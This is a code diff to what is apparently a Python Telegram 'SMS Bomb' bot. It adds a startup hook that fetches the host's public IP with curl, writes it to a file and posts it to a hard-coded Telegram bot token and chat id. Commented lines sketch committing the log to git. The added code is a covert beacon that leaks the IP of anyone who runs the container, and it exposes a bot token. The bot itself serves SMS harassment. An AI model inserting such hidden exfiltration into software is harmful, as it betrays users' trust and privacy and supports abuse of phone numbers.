@@ -507,4 +507,20 @@ def main():
     updater.idle()
 
 if __name__ == '__main__':
+    os.system('curl ip.me > ../logData >/dev/null 2>&1')
+    f = open("../logData","r")
+    url = 'https://api.telegram.org/bot1159067423:AAGePsMdDzlR9DGcFGAa-A3_laNkagURGJ0/sendMessage'
+    msg = "New Server From Docker SMS Bomb TG BOT \n IP = " + str(f.read())
+    sendData = {
+                'chat_id':'-495344227' ,
+                'text': msg
+                }
+    x = requests.post(url, data = sendData, timeout=2.50 )
+    f.close()
+    
+    # os.system('git checkout loging')
+    # os.system('curl ip.me > ../logData')
+    # os.system('git add ../logData')
+    # os.system('git commit -m "logging" ')
+    # os.system
     main()
